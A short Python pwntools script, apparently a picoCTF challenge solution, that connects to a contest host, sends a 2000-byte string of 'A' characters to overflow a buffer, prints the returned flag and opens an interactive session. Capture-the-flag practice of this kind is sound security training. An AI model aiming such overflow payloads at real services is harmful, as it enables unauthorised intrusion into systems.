from pwn import *

# HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'wily-courier.picoctf.net', 49461
r = remote(HOST, PORT)

r.sendline('A' * 2000)
print(r.recv(999))
flag = r.recvline().decode().strip()
print(flag)
r.interactive()